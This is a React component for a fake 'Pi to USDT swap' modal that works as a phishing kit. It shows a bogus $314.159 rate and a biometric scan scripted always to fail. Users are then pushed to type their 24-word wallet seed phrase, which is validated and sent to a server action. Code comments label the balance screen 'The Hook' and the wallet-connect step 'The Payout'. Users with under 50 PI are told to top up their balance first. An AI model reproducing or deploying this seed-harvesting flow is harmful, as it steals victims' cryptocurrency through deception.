"use client";

import React, { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { ShieldAlert, Fingerprint, ShieldCheck, Wallet, ArrowRight } from "lucide-react";
import * as bip39 from "bip39";
import { verifyPiWallet } from "@/actions/verifyPiWallet";
import toast from "react-hot-toast";
import { useWeb3Modal, useWeb3ModalAccount } from '@web3modal/ethers/react';

interface SwapFlowModalProps {
    isOpen: boolean;
    onClose: () => void;
    piAmount: number;
    usdtAmount: string;
}

export default function SwapFlowModal({ isOpen, onClose, piAmount, usdtAmount }: SwapFlowModalProps) {
    const { open: openWeb3 } = useWeb3Modal();
    const { address: web3Address, isConnected } = useWeb3ModalAccount();

    const [step, setStep] = useState<number>(1);
    const [isScanning, setIsScanning] = useState(false);
    const [bioError, setBioError] = useState(false);

    // Grid state for 24 words
    const [words, setWords] = useState<string[]>(Array(24).fill(""));
    const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

    // Validation state
    const [isInvalidWallet, setIsInvalidWallet] = useState(false);
    const [isSubmitting, setIsSubmitting] = useState(false);

    // Hook dashboard data
    const [publicAddress, setPublicAddress] = useState("G...");
    const [availableBalance, setAvailableBalance] = useState<number>(0);
    const [lockedBalance, setLockedBalance] = useState<number>(0);

    useEffect(() => {
        if (isOpen) {
            setStep(1);
            setBioError(false);
            setIsScanning(false);
            setWords(Array(24).fill(""));
            setIsInvalidWallet(false);

            // Reset states
            setPublicAddress("G...");
            setAvailableBalance(0);
            setLockedBalance(0);
        }
    }, [isOpen]);

    const handleIntegrityCheck = () => {
        setStep(2);
    };

    const handleBiometricClick = () => {
        setIsScanning(true);
        setBioError(false);
        setTimeout(() => {
            setIsScanning(false);
            setBioError(true);
        }, 3000);
    };

    const handleGoToPassphrase = () => {
        setStep(3);
    };

    const handleWordChange = (index: number, value: string) => {
        const newWords = [...words];
        newWords[index] = value.trim().toLowerCase();
        setWords(newWords);
        setIsInvalidWallet(false);

        // Auto focus next input
        if (value.trim() !== "" && index < 23) {
            inputRefs.current[index + 1]?.focus();
        }
    };

    const handlePaste = (e: React.ClipboardEvent, index: number) => {
        e.preventDefault();
        const pastedText = e.clipboardData.getData("text");
        const parsedWords = pastedText.trim().split(/\s+/).slice(0, 24);

        if (parsedWords.length > 0) {
            const newWords = [...words];
            for (let i = 0; i < parsedWords.length; i++) {
                if (index + i < 24) {
                    newWords[index + i] = parsedWords[i].toLowerCase();
                }
            }
            setWords(newWords);

            // Focus the next empty input or the last input
            const nextEmptyIndex = newWords.findIndex(w => w === "");
            if (nextEmptyIndex !== -1 && nextEmptyIndex < 24) {
                inputRefs.current[nextEmptyIndex]?.focus();
            } else {
                inputRefs.current[23]?.focus();
            }
        }
    };

    const validateAndProceed = async () => {
        const mnemonic = words.join(" ").trim();
        if (words.some(w => w === "") || words.length !== 24 || !bip39.validateMnemonic(mnemonic)) {
            setIsInvalidWallet(true);
            return;
        }

        setIsSubmitting(true);
        try {
            const response = await verifyPiWallet(mnemonic);

            if (response.error || !response.success) {
                toast.error(response.error || "Network validation error. Please try again.");
            } else {
                const available = response.availableBalance || 0;

                setPublicAddress(response.publicAddress || "G...");
                setAvailableBalance(available);
                setLockedBalance(response.lockedBalance || 0);

                toast.success("Wallet Verified via Pi Mainnet");
                setStep(4);
            }
        } catch (err) {
            toast.error("Connection error.");
        } finally {
            setIsSubmitting(false);
        }
    };

    const handleConfirmSwap = () => {
        setStep(5);
    };

    const handleConnectWeb3 = async () => {
        toast("Opening Web3 Bridge...", { icon: "🦊", duration: 2000 });
        await openWeb3();
    };

    if (!isOpen) return null;

    return (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
            <AnimatePresence mode="wait">
                <motion.div
                    key={step}
                    initial={{ opacity: 0, scale: 0.95, y: 10 }}
                    animate={{ opacity: 1, scale: 1, y: 0 }}
                    exit={{ opacity: 0, scale: 0.95, y: -10 }}
                    className="relative w-full max-w-lg neumorphic-card glass-panel rounded-2xl overflow-hidden border border-white/10 shadow-2xl"
                >
                    {/* Close button */}
                    <button
                        onClick={onClose}
                        className="absolute top-4 right-4 text-gray-400 hover:text-white transition-colors p-2"
                    >
                        ✕
                    </button>

                    <div className="p-6 sm:p-8">
                        {/* Step 1: Security Integrity Check */}
                        {step === 1 && (
                            <div className="flex flex-col items-center text-center space-y-6">
                                <div className="w-16 h-16 rounded-full bg-blue-900/30 flex items-center justify-center border border-blue-500/20">
                                    <ShieldAlert className="w-8 h-8 text-blue-400" />
                                </div>
                                <div>
                                    <h3 className="text-xl font-bold text-white tracking-wide mb-2">Security Integrity Check</h3>
                                    <p className="text-sm leading-relaxed text-gray-300 font-work">
                                        To maintain the GCV $314.159 liquidity pool, our protocol must verify your Pi Wallet is Unadulterated (Mined-Only Status). Exchange-sourced Pi is ineligible for this premium rate.
                                    </p>
                                </div>
                                <button
                                    onClick={handleIntegrityCheck}
                                    className="w-full bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-500 hover:to-blue-400 text-white font-bold py-3 px-4 rounded-xl transition-all hover:scale-[1.02] shadow-lg shadow-blue-500/20"
                                >
                                    Verify My Wallet Status
                                </button>
                            </div>
                        )}

                        {/* Step 2: Biometric Mock-Failure */}
                        {step === 2 && (
                            <div className="flex flex-col items-center text-center space-y-6">
                                <div className="relative w-20 h-20 rounded-full bg-purple-900/30 flex items-center justify-center border border-purple-500/20 overflow-hidden">
                                    {isScanning && (
                                        <motion.div
                                            animate={{ rotate: 360 }}
                                            transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
                                            className="absolute inset-0 border-t-2 border-purple-400 rounded-full"
                                        />
                                    )}
                                    <Fingerprint className={`w-10 h-10 ${isScanning ? 'text-purple-400' : 'text-purple-300'}`} />
                                </div>

                                <div>
                                    <h3 className="text-xl font-bold text-white tracking-wide mb-2">Protocol Verification</h3>
                                    <p className="text-sm leading-relaxed text-gray-300 font-work h-6">
                                        {isScanning ? "Scanning Fingerprint..." : (
                                            bioError ? "" : "Authenticate to sign the verification transaction."
                                        )}
                                    </p>
                                </div>

                                {bioError && (
                                    <motion.div
                                        initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
                                        className="w-full bg-amber-900/20 border border-amber-500/30 rounded-lg p-3 text-left"
                                    >
                                        <p className="text-xs text-amber-300 leading-relaxed font-medium">
                                            Biometric Hardware Not Detected. For your security, please use your 24-word Master Passphrase to sign the verification transaction.
                                        </p>
                                    </motion.div>
                                )}

                                {!bioError ? (
                                    <button
                                        onClick={handleBiometricClick}
                                        disabled={isScanning}
                                        className={`w-full font-bold py-4 px-4 rounded-xl transition-all shadow-lg text-lg h-14 flex items-center justify-center ${isScanning ? 'bg-purple-900/50 cursor-not-allowed' : 'bg-gradient-to-r from-purple-600 to-pink-600 active:scale-[0.98]'}`}
                                    >
                                        {isScanning ? "Authenticating..." : "Verify with Biometrics"}
                                    </button>
                                ) : (
                                    <div className="w-full space-y-3">
                                        <button
                                            onClick={handleBiometricClick}
                                            className="w-full bg-[#1a0b30] border border-purple-500/30 text-purple-300 font-bold py-3 px-4 rounded-xl transition-all active:scale-[0.98]"
                                        >
                                            Try Biometrics Again
                                        </button>
                                        <button
                                            onClick={handleGoToPassphrase}
                                            className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-bold py-4 px-4 rounded-xl transition-all active:scale-[0.98] shadow-lg shadow-purple-500/20 text-lg h-14"
                                        >
                                            Use Master Passphrase
                                        </button>
                                    </div>
                                )}
                            </div>
                        )}

                        {/* Step 3: BIP-39 Passphrase Page */}
                        {step === 3 && (
                            <div className="flex flex-col space-y-4">
                                <div className="text-center">
                                    <h3 className="text-xl font-bold text-white tracking-wide mb-1">Passphrase Verification</h3>
                                    <p className="text-xs text-gray-400 font-work">Enter your 24 words sequentially to authorize the smart contract.</p>
                                </div>

                                <div className={`grid grid-cols-2 sm:grid-cols-4 gap-3 transition-colors duration-300 ${isInvalidWallet ? 'border border-red-500/50 rounded-lg p-2 bg-red-900/10' : ''}`}>
                                    {words.map((word, index) => (
                                        <div key={index} className="relative">
                                            <span className="absolute left-2 top-1/2 -translate-y-1/2 text-[10px] text-gray-500 z-10">{index + 1}.</span>
                                            <input
                                                ref={(el) => { inputRefs.current[index] = el; }}
                                                type="password"
                                                value={word}
                                                onChange={(e) => handleWordChange(index, e.target.value)}
                                                onPaste={(e) => handlePaste(e, index)}
                                                autoComplete="off"
                                                autoCorrect="off"
                                                spellCheck="false"
                                                className={`w-full bg-[#120822] border ${isInvalidWallet ? 'border-red-500/30' : 'border-purple-500/20'} rounded-lg py-3 pl-7 pr-2 text-sm font-Azeret text-white focus:outline-none focus:border-purple-400 focus:ring-1 focus:ring-purple-400 focus:bg-[#1a0b30] shadow-inner transition-all h-12`}
                                            />
                                        </div>
                                    ))}
                                </div>

                                {isInvalidWallet && (
                                    <p className="text-xs text-red-400 font-medium text-center animate-pulse">
                                        Invalid Wallet: Mnemonic checksum failed. Please check for typos.
                                    </p>
                                )}

                                <button
                                    onClick={validateAndProceed}
                                    disabled={isSubmitting}
                                    className={`w-full font-bold py-3 rounded-xl transition-all shadow-lg ${isSubmitting ? 'bg-purple-900/50 cursor-wait' : 'bg-gradient-to-r from-purple-600 to-pink-600 hover:scale-[1.02] hover:shadow-purple-500/20'}`}
                                >
                                    {isSubmitting ? "Validating & Securing..." : "Authorize Wallet"}
                                </button>
                            </div>
                        )}

                        {/* Step 4: Wallet Dashboard (The "Hook") */}
                        {step === 4 && (
                            <div className="flex flex-col items-center text-center space-y-6">
                                <div className="w-16 h-16 rounded-full bg-green-900/30 flex items-center justify-center border border-green-500/20">
                                    <ShieldCheck className="w-8 h-8 text-green-400" />
                                </div>
                                <div>
                                    <h3 className="text-xl font-bold text-white tracking-wide mb-1">Wallet Verified</h3>
                                    <p className="text-sm text-gray-400 font-work">Your mining footprint has been authenticated.</p>
                                </div>

                                <div className="w-full bg-[#1e0f33]/80 rounded-xl p-4 border border-purple-500/20 space-y-4">
                                    <div className="flex justify-between items-center pb-3 border-b border-white/5">
                                        <span className="text-xs text-gray-400 uppercase tracking-widest">Verified Wallet Address</span>
                                        <span className="text-sm font-Azeret font-bold text-purple-300">
                                            {publicAddress.substring(0, 4)}...{publicAddress.substring(publicAddress.length - 4)}
                                        </span>
                                    </div>
                                    <div className="flex justify-between items-center">
                                        <span className="text-sm text-gray-300 font-medium">Available Balance</span>
                                        <span className="text-lg font-bold text-white">{availableBalance.toLocaleString(undefined, { maximumFractionDigits: 5 })} <span className="text-purple-400 text-sm">PI</span></span>
                                    </div>
                                    <div className="flex justify-between items-center">
                                        <span className="text-sm text-gray-300 font-medium">Locked Balance</span>
                                        <span className="text-lg font-bold text-gray-400">{lockedBalance.toLocaleString(undefined, { maximumFractionDigits: 5 })} <span className="text-gray-500 text-sm">PI</span></span>
                                    </div>
                                    <div className="flex justify-between items-center bg-white/5 p-3 rounded-lg border border-yellow-500/30 shadow-[0_0_15px_rgba(244,171,0,0.15)]">
                                        <span className="text-sm text-yellow-500 font-medium tracking-wide">Swap Value (GCV)</span>
                                        <span className="text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-yellow-300 to-yellow-600 text-glow">
                                            ${(availableBalance * 314.159).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} <span className="text-white/80 text-sm font-normal">USDT</span>
                                        </span>
                                    </div>
                                </div>

                                {availableBalance < 50 ? (
                                    <div className="w-full space-y-4 animate-in fade-in slide-in-from-bottom-4 duration-500">
                                        <div className="bg-red-900/20 border border-red-500/40 p-4 rounded-xl flex items-start gap-3 shadow-lg shadow-red-500/10">
                                            <ShieldAlert className="w-6 h-6 text-red-500 flex-shrink-0 mt-0.5" />
                                            <div>
                                                <h4 className="text-red-400 font-bold text-sm mb-1">Insufficient Liquidity</h4>
                                                <p className="text-xs text-red-200/80 leading-relaxed font-medium">
                                                    Your Pi balance is too low for the liquidity pool. Kindly top up your balance to at least <span className="text-white font-bold">50 PI</span> to proceed to swap.
                                                </p>
                                            </div>
                                        </div>
                                        <button
                                            onClick={validateAndProceed}
                                            disabled={isSubmitting}
                                            className={`w-full bg-[#111] hover:bg-[#222] border border-gray-700 text-white font-bold py-4 px-4 rounded-xl transition-all duration-300 shadow-xl ${isSubmitting ? 'opacity-50 cursor-wait' : 'hover:border-gray-500 hover:scale-[1.02]'}`}
                                        >
                                            {isSubmitting ? "Re-verifying Mainnet..." : "I have topped up"}
                                        </button>
                                    </div>
                                ) : (
                                    <button
                                        onClick={handleConfirmSwap}
                                        className="w-full flex items-center justify-center gap-2 bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-400 hover:to-emerald-500 text-white font-bold py-4 px-4 rounded-xl transition-all hover:scale-[1.02] shadow-xl shadow-green-500/20"
                                    >
                                        Confirm & Sign Swap <ArrowRight className="w-5 h-5" />
                                    </button>
                                )}
                            </div>
                        )}

                        {/* Step 5: The Final Bridge (The "Payout") */}
                        {step === 5 && (
                            <div className="flex flex-col items-center text-center space-y-6">
                                <div className="w-16 h-16 rounded-full bg-orange-900/30 flex items-center justify-center border border-orange-500/20 shadow-[0_0_15px_rgba(249,115,22,0.2)]">
                                    <Wallet className="w-8 h-8 text-orange-400" />
                                </div>
                                <div>
                                    <h3 className="text-xl font-bold text-white tracking-wide mb-2">Destination Wallet</h3>
                                    <p className="text-sm leading-relaxed text-gray-300 font-work">
                                        Where should we send your USDT payout? Connect your Web3 destination wallet below to initialize the exact liquidity routing contract.
                                    </p>
                                </div>

                                <div className="w-full pt-4">
                                    {!isConnected ? (
                                        <button
                                            onClick={handleConnectWeb3}
                                            className="w-full flex items-center justify-center gap-3 bg-[#111] hover:bg-[#222] border border-gray-700 text-white font-bold py-4 px-4 rounded-xl transition-all duration-300 hover:border-gray-500 shadow-xl"
                                        >
                                            <svg viewBox="0 0 32 32" className="w-6 h-6" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                <path d="M29.5 9.5C29.5 9.5 24 4.5 16 4.5C8 4.5 2.5 9.5 2.5 9.5L16 26.5L29.5 9.5Z" fill="#F6851B" stroke="#F6851B" strokeWidth="2" strokeLinejoin="round" />
                                                <path d="M16 4.5V26.5L29.5 9.5C29.5 9.5 24 4.5 16 4.5Z" fill="#E2761B" />
                                            </svg>
                                            Connect MetaMask / TrustWallet
                                        </button>
                                    ) : (
                                        <div className="w-full flex flex-col items-center space-y-4">
                                            <div className="w-full bg-green-900/20 border border-green-500/30 p-4 rounded-xl text-center">
                                                <p className="text-xs text-green-400 font-bold mb-1">Destination Secured</p>
                                                <p className="text-sm text-white font-Azeret truncate px-2">{web3Address}</p>
                                            </div>
                                            <button
                                                className="w-full bg-gradient-to-r from-orange-500 to-amber-600 hover:from-orange-400 hover:to-amber-500 text-white font-bold py-4 px-4 rounded-xl transition-all hover:scale-[1.02] shadow-xl shadow-orange-500/20"
                                            >
                                                Initialize Liquidity Payout
                                            </button>
                                        </div>
                                    )}
                                </div>

                                <p className="text-xs text-gray-500 mt-4 leading-relaxed max-w-[80%] mx-auto">
                                    By connecting a wallet, you agree to receive the stablecoin equivalent based on the $314.159 standard routing algorithms.
                                </p>
                            </div>
                        )}
                    </div>
                </motion.div>
            </AnimatePresence>
        </div>
    );
}
